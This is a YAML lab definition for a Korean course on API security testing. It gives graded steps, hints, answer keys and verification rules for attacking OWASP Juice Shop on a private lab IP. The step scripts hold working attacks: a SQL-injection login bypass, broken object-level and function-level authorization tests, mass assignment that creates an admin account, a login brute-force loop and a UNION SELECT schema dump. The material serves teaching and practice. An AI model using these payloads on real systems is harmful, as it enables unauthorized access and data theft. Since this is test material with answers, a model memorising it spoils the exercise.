lab_id: web-vuln-ai-week12
title: API 보안 취약점 실습 (AI 지원)
version: ai
course: web-vuln-ai
week: 12
description: JuiceShop의 REST API를 대상으로 인증 우회, 과도한 데이터 노출, Mass Assignment, Rate Limiting 부재 등 OWASP API
  Top 10 취약점을 실습합니다. AI SubAgent가 자동으로 명령을 실행하고 결과를 검증합니다.
difficulty: hard
duration_minutes: 120
objectives:
- OWASP API Security Top 10 취약점을 이해한다
- API 인증/인가 취약점을 탐지하고 공격한다
- API Rate Limiting, 데이터 노출 등 설계 취약점을 분석한다
pass_threshold: 0.6
steps:
- order: 1
  instruction: JuiceShop(:3000)의 API 엔드포인트를 체계적으로 매핑하시오. /api/, /rest/ 경로 하위의 모든 리소스를 탐색하라.
  hint: curl로 /api/Products, /api/Users, /api/Feedbacks, /api/Challenges, /api/Recycles, /rest/products/search,
    /rest/user/login 등을 순차적으로 요청하세요.
  category: recon
  points: 8
  answer: '🤖 프롬프트: JuiceShop(:3000)의 API 엔드포인트를 체계적으로 매핑하시오. /api/, /rest/ 경로 하위의 모든 리소스를 탐색해줘

    📎 참고 (CLI): echo ''=== JuiceShop API Endpoint Map ==='' && for EP in api/Products api/Users api/Feedbacks
    api/Challenges api/Recycles api/SecurityQuestions rest/products/search rest/user/login rest/track-order;
    do echo -n "/$EP: " && curl -s -o /dev/null -w ''%{http_code}'' http://10.20.30.80:3000/$EP 2>/dev/null
    && echo ''''; done && echo ''=== API Mapping Complete ==='''
  answer_detail: API 엔드포인트 매핑은 API 보안 테스트의 기초입니다. 200(접근 가능), 401(인증 필요), 403(권한 부족), 404(미존재) 응답을 구분하여
    공격 표면을 파악합니다. 인증 없이 200이 반환되는 엔드포인트가 첫 번째 공격 대상입니다.
  verify:
    type: output_contains
    expect: API Mapping Complete
    field: stdout
    semantic:
      intent: JuiceShop API 엔드포인트 매핑 — /api/ /rest/ 경로 하위 리소스 체계적 탐색
      success_criteria:
      - swagger.json 또는 api-docs 조회 또는 brute force 로 경로 최소 5개 수집
      - 각 엔드포인트의 HTTP 메서드 기록
      - 인증 요구 여부 구분
      acceptable_methods:
      - curl <url>/api-docs 또는 /swagger.json
      - ffuf -u <url>/api/FUZZ -w wordlist
      - gobuster dir -u <url>/rest
      - Burp Suite 사이트맵
      negative_signs:
      - 엔드포인트 1-2개만
      - HTTP 메서드 정보 없음
      - 인증 요구 여부 누락
  target_vm: attacker
  script: 'echo ''=== JuiceShop API Endpoint Map ==='' && for EP in api/Products api/Users api/Feedbacks
    api/Challenges api/Recycles api/SecurityQuestions rest/products/search rest/user/login rest/track-order;
    do echo -n "/$EP: " && curl -s -o /dev/null -w ''%{http_code}'' http://10.20.30.80:3000/$EP 2>/dev/null
    && echo ''''; done && echo ''=== API Mapping Complete ==='''
  risk_level: low
  bastion_prompt: JuiceShop(:3000)의 API 엔드포인트를 체계적으로 매핑하시오. /api/, /rest/ 경로 하위의 모든 리소스를 탐색해줘
- order: 2
  instruction: 인증 없이 접근 가능한 API에서 사용자 목록을 조회하시오. /api/Users/ 응답에서 과도한 데이터 노출(Excessive Data Exposure)을
    확인하라.
  hint: 인증 토큰 없이 curl http://{{WEB_IP}}:3000/api/Users/ 를 요청하세요. 응답에 패스워드 해시, 이메일 등 민감 정보가 포함되는지 확인합니다.
  category: exploit
  points: 12
  answer: '🤖 프롬프트: 인증 없이 접근 가능한 API에서 사용자 목록을 조회하시오. /api/Users/ 응답에서 과도한 데이터 노출(Excessive Data Exposure)을
    확인해줘

    📎 참고 (CLI): curl -s http://10.20.30.80:3000/api/Users/ | python3 -c "import sys,json; data=json.load(sys.stdin).get(''data'',[]);
    [print(f''User {u.get(\"id\")}: email={u.get(\"email\")}, role={u.get(\"role\",\"N/A\")}'') for u
    in data[:5]]" 2>/dev/null || curl -s http://10.20.30.80:3000/api/Users/ | head -c 500'
  answer_detail: 'OWASP API #3 Excessive Data Exposure: API가 클라이언트가 필요한 것보다 많은 데이터를 반환합니다. 사용자 이메일, 패스워드
    해시, createdAt 등의 민감 정보가 필터링 없이 노출되면, 공격자가 이를 크리덴셜 스터핑이나 소셜 엔지니어링에 활용할 수 있습니다.'
  verify:
    type: output_contains
    expect: email
    field: stdout
    semantic:
      intent: Excessive Data Exposure — 인증 없이 /api/Users/ 호출해 이메일·해시 등 PII 노출 여부 확인 (OWASP API3)
      success_criteria:
      - curl 로 /api/Users/ GET 요청
      - 응답에 email, password, isAdmin 등 민감 필드 노출 여부 확인
      - 필드 필터링(whitelisting output) 방어 권고
      acceptable_methods:
      - curl <url>/api/Users/
      - python requests.get + json parse
      - Postman Collection
      - OWASP API Security Top 10 참조
      negative_signs:
      - 인증된 요청만
      - 민감 필드 확인 없음
      - 방어 권고 없음
  target_vm: attacker
  script: 'curl -s http://10.20.30.80:3000/api/Users/ | python3 -c "import sys,json; data=json.load(sys.stdin).get(''data'',[]);
    [print(f''User {u.get(\"id\")}: email={u.get(\"email\")}, role={u.get(\"role\",\"N/A\")}'') for u
    in data[:5]]" 2>/dev/null || curl -s http://10.20.30.80:3000/api/Users/ | head -c 500'
  risk_level: medium
  bastion_prompt: 인증 없이 접근 가능한 API에서 사용자 목록을 조회하시오. /api/Users/ 응답에서 과도한 데이터 노출(Excessive Data Exposure)을
    확인해줘
- order: 3
  instruction: Broken Object Level Authorization(BOLA) 취약점을 테스트하시오. 인증된 사용자 토큰으로 다른 사용자의 장바구니(/rest/basket/1,
    /rest/basket/2)에 접근하라.
  hint: SQL Injection으로 로그인한 후, Authorization 헤더로 다른 ID의 basket에 접근하세요.
  category: exploit
  points: 12
  answer: '🤖 프롬프트: Broken Object Level Authorization(BOLA) 취약점을 테스트해줘

    📎 참고 (CLI): TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json''
    -d ''{"email":"'' or 1=1--","password":"a"}'' | grep -o ''"token":"[^"]*"'' | cut -d''"'' -f4) &&
    for i in 1 2 3; do echo "=== Basket $i ===" && curl -s http://10.20.30.80:3000/rest/basket/$i -H "Authorization:
    Bearer $TOKEN" -o /dev/null -w ''HTTP:%{http_code}'' && echo ''''; done'
  answer_detail: 'OWASP API #1 BOLA: API가 객체 수준의 권한 확인을 하지 않아, 다른 사용자의 리소스에 접근할 수 있습니다. basket/1, basket/2처럼
    순차적 ID를 열거하면 모든 사용자의 장바구니를 조회할 수 있습니다.'
  verify:
    type: output_contains
    expect: Basket
    field: stdout
    semantic:
      intent: BOLA (OWASP API1) — 다른 사용자 basket id 로 접근 시도해 인가 검증 누락 확인
      success_criteria:
      - 인증 토큰 획득 후 /rest/basket/1, /basket/2 등 순회
      - 본인 외 basket 응답 반환 여부
      - 서버가 소유권 검증 안함 판정
      acceptable_methods:
      - for id in 1 2 3; do curl -H Auth... /rest/basket/$id; done
      - Burp autorize
      - ffuf -w ids.txt
      - autorize extension
      negative_signs:
      - 본인 id 만
      - 응답 분석 없음
      - 인가 검증 개념 누락
  target_vm: attacker
  script: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json''
    -d ''{"email":"'' or 1=1--","password":"a"}'' | grep -o ''"token":"[^"]*"'' | cut -d''"'' -f4) &&
    for i in 1 2 3; do echo "=== Basket $i ===" && curl -s http://10.20.30.80:3000/rest/basket/$i -H "Authorization:
    Bearer $TOKEN" -o /dev/null -w ''HTTP:%{http_code}'' && echo ''''; done'
  risk_level: medium
  bastion_prompt: Broken Object Level Authorization(BOLA) 취약점을 테스트해줘
- order: 4
  instruction: Mass Assignment 공격을 수행하시오. 사용자 등록 API(/api/Users/)에 role과 isAdmin 필드를 추가하여 관리자 계정을 생성하라.
  hint: POST /api/Users/ 에 {"email":"hacker@test.com","password":"test1234","role":"admin","isAdmin":true}
    형태로 요청하세요.
  category: exploit
  points: 12
  answer: "\U0001F916 프롬프트: Mass Assignment 공격을 수행해줘\n\U0001F4CE 참고 (CLI): curl -s -X POST http://10.20.30.80:3000/api/Users/\
    \ \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"email\":\"massassign_test@test.com\",\"password\"\
    :\"hack1234\",\"passwordRepeat\":\"hack1234\",\"role\":\"admin\",\"isAdmin\":true}' \\\n | python3\
    \ -c \"import sys,json; d=json.load(sys.stdin).get('data',{}); print(f'id={d.get(\\\"id\\\")}, email={d.get(\\\
    \"email\\\")}, role={d.get(\\\"role\\\",\\\"?\\\")}, isAdmin={d.get(\\\"isAdmin\\\",\\\"?\\\")}')\"\
    \ 2>/dev/null || curl -s -X POST http://10.20.30.80:3000/api/Users/ -H 'Content-Type: application/json'\
    \ -d '{\"email\":\"massassign_test@test.com\",\"password\":\"hack1234\",\"passwordRepeat\":\"hack1234\"\
    ,\"role\":\"admin\"}'"
  answer_detail: 'OWASP API #6 Mass Assignment: 서버가 클라이언트 요청의 모든 필드를 그대로 모델에 바인딩하면, 공격자가 role, isAdmin
    같은 숨겨진 필드를 추가하여 권한 상승을 할 수 있습니다. 응답에 role:admin이 반영되면 취약합니다.'
  verify:
    type: output_contains
    expect: email
    field: stdout
    semantic:
      intent: Mass Assignment (OWASP API6) — 등록 API 에 role 또는 isAdmin 필드를 추가 전송해 권한 승격 시도
      success_criteria:
      - 사용자 등록 POST 에 role/isAdmin 필드 추가
      - 생성된 계정의 권한 확인 (GET /api/Users/<id>)
      - 필드 화이트리스트 방어 권고
      acceptable_methods:
      - curl -d {email,password,role:admin} /api/Users
      - Burp Repeater 로 필드 추가
      - python requests.post
      - OWASP API Mass Assignment 가이드 참조
      negative_signs:
      - role 필드 없이 일반 등록만
      - 생성 후 권한 확인 없음
      - 방어 권고 누락
  target_vm: attacker
  script: "curl -s -X POST http://10.20.30.80:3000/api/Users/ \\\n  -H 'Content-Type: application/json'\
    \ \\\n  -d '{\"email\":\"massassign_test@test.com\",\"password\":\"hack1234\",\"passwordRepeat\":\"\
    hack1234\",\"role\":\"admin\",\"isAdmin\":true}' \\\n | python3 -c \"import sys,json; d=json.load(sys.stdin).get('data',{});\
    \ print(f'id={d.get(\\\"id\\\")}, email={d.get(\\\"email\\\")}, role={d.get(\\\"role\\\",\\\"?\\\"\
    )}, isAdmin={d.get(\\\"isAdmin\\\",\\\"?\\\")}')\" 2>/dev/null || curl -s -X POST http://10.20.30.80:3000/api/Users/\
    \ -H 'Content-Type: application/json' -d '{\"email\":\"massassign_test@test.com\",\"password\":\"\
    hack1234\",\"passwordRepeat\":\"hack1234\",\"role\":\"admin\"}'"
  risk_level: medium
  bastion_prompt: Mass Assignment 공격을 수행해줘
- order: 5
  instruction: Rate Limiting 부재를 확인하시오. 로그인 API에 잘못된 비밀번호로 20회 연속 요청을 보내 계정 잠금이나 속도 제한이 있는지 테스트하라.
  hint: for 루프로 curl -X POST /rest/user/login 에 잘못된 비밀번호를 반복 전송하세요.
  category: exploit
  points: 10
  answer: '🤖 프롬프트: Rate Limiting 부재를 확인해줘

    📎 참고 (CLI): echo ''=== Rate Limiting Test (20 attempts) ==='' && for i in $(seq 1 20); do echo -n
    "Attempt $i: " && curl -s -o /dev/null -w ''%{http_code}'' -X POST http://10.20.30.80:3000/rest/user/login
    -H ''Content-Type: application/json'' -d ''{"email":"admin@juice-sh.op","password":"wrong_''"$i"''"}''
    && echo ''''; done | tail -5 && echo ''=== Rate Limit Test Complete ==='''
  answer_detail: 'OWASP API #4 Lack of Resources & Rate Limiting: Rate Limiting이 없으면 브루트포스, 크리덴셜 스터핑 공격이
    가능합니다. 20회 시도 후에도 429(Too Many Requests)가 발생하지 않으면 취약합니다.'
  verify:
    type: output_contains
    expect: Rate Limit Test Complete
    field: stdout
    semantic:
      intent: Rate Limiting 부재 — 로그인 API 에 20회 연속 잘못된 비밀번호 시도 후 429/계정잠금 여부 확인
      success_criteria:
      - for 루프 또는 Burp Intruder 로 20회 시도
      - 응답 코드 429/403 또는 계정잠금 메시지 확인
      - IP/계정 단위 rate limit 권고
      acceptable_methods:
      - for i in {1..20}; do curl ...; done
      - Burp Intruder sniper
      - hydra 또는 medusa
      - python asyncio 로 병렬 시도
      negative_signs:
      - 5회 이하만
      - 429 응답 해석 없음
      - 방어 권고 없음
  target_vm: attacker
  script: 'echo ''=== Rate Limiting Test (20 attempts) ==='' && for i in $(seq 1 20); do echo -n "Attempt
    $i: " && curl -s -o /dev/null -w ''%{http_code}'' -X POST http://10.20.30.80:3000/rest/user/login
    -H ''Content-Type: application/json'' -d ''{"email":"admin@juice-sh.op","password":"wrong_''"$i"''"}''
    && echo ''''; done | tail -5 && echo ''=== Rate Limit Test Complete ==='''
  risk_level: medium
  bastion_prompt: Rate Limiting 부재를 확인해줘
- order: 6
  instruction: Broken Function Level Authorization을 테스트하시오. 인증된 사용자 토큰으로 관리자 전용 HTTP 메서드(PUT, DELETE)에
    접근하라.
  hint: curl -X GET/PUT/DELETE /api/Products/1 으로 각 메서드를 테스트하세요.
  category: exploit
  points: 12
  answer: '🤖 프롬프트: Broken Function Level Authorization을 테스트해줘

    📎 참고 (CLI): TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json''
    -d ''{"email":"'' or 1=1--","password":"a"}'' | grep -o ''"token":"[^"]*"'' | cut -d''"'' -f4) &&
    echo ''=== Function Level Auth Test ==='' && for METHOD in GET PUT DELETE OPTIONS; do echo -n "$METHOD
    /api/Products/1: " && curl -s -o /dev/null -w ''%{http_code}'' -X $METHOD http://10.20.30.80:3000/api/Products/1
    -H ''Content-Type: application/json'' -H "Authorization: Bearer $TOKEN" && echo ''''; done && echo
    ''=== Auth Test Complete ==='''
  answer_detail: 'OWASP API #5 Broken Function Level Authorization: 서버가 HTTP 메서드별로 권한을 구분하지 않으면, GET은
    허용하지만 PUT/DELETE도 허용될 수 있습니다. 관리자 전용 기능(사용자 수정/삭제)에 일반 사용자가 접근 가능하면 심각한 취약점입니다.'
  verify:
    type: output_contains
    expect: Auth Test Complete
    field: stdout
    semantic:
      intent: Broken Function Level Authorization (OWASP API5) — 일반 사용자 토큰으로 관리자 전용 메서드(PUT/DELETE) 시도
      success_criteria:
      - PUT 또는 DELETE 메서드 호출 시도
      - 응답 코드(200/403) 와 실제 상태 변경 여부 확인
      - 역할 기반 인가(RBAC) 누락 판정
      acceptable_methods:
      - curl -X DELETE -H Auth... /api/Products/1
      - curl -X PUT -H Auth... /api/Users/2
      - Burp Repeater 로 메서드 변경
      - autorize extension
      negative_signs:
      - GET 만 시도
      - 메서드별 응답 비교 없음
      - RBAC 개념 누락
  target_vm: attacker
  script: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json''
    -d ''{"email":"'' or 1=1--","password":"a"}'' | grep -o ''"token":"[^"]*"'' | cut -d''"'' -f4) &&
    echo ''=== Function Level Auth Test ==='' && for METHOD in GET PUT DELETE OPTIONS; do echo -n "$METHOD
    /api/Products/1: " && curl -s -o /dev/null -w ''%{http_code}'' -X $METHOD http://10.20.30.80:3000/api/Products/1
    -H ''Content-Type: application/json'' -H "Authorization: Bearer $TOKEN" && echo ''''; done && echo
    ''=== Auth Test Complete ==='''
  risk_level: medium
  bastion_prompt: Broken Function Level Authorization을 테스트해줘
- order: 7
  instruction: SQL Injection을 통한 API 데이터 탈취를 수행하시오. /rest/products/search 엔드포인트에서 UNION SELECT로 데이터베이스
    스키마를 추출하라.
  hint: q 파라미터에 test'))UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master-- 형태의 페이로드를 넣으세요.
  category: exploit
  points: 12
  answer: '🤖 프롬프트: SQL Injection을 통한 API 데이터 탈취를 수행하시오. /rest/products/search 엔드포인트에서 UNION SELECT로 데이터베이스
    스키마를 추출해줘

    📎 참고 (CLI): curl -s ''http://10.20.30.80:3000/rest/products/search?q=test%27))UNION+SELECT+sql,2,3,4,5,6,7,8,9+FROM+sqlite_master+WHERE+type=%27table%27--''
    | head -c 500'
  answer_detail: JuiceShop의 검색 API는 SQLite를 사용하며, 입력 검증이 없어 UNION SELECT로 다른 테이블의 데이터를 추출할 수 있습니다. sqlite_master
    테이블에서 전체 스키마를 조회하면 Users, Cards 등의 민감 테이블 구조가 노출됩니다.
  verify:
    type: output_contains
    expect: data
    field: stdout
